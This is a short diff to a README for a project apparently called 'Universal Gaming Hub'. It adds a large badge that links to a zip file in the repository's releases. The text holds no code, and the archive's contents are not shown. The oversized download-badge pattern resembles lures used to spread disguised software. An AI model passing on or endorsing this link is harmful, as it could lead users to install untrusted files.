@@ -1,3 +1,10 @@
+<p align="center">
+  <a href="https://github.com/thundertigercontinue/Universal-Gaming-Hub/releases/download/GamingHub/Gaming.Hub.zip">
+    <img src="https://img.shields.io/badge/⬇%20%20DOWNLOAD%20LATEST%20VERSION-7C3AED?style=for-the-badge&logo=github&logoColor=white" alt="Download Latest Version" height="65" />
+  </a>
+</p>
+
+
 # 🎮 Universal Gaming Hub
 
 <p align="center">
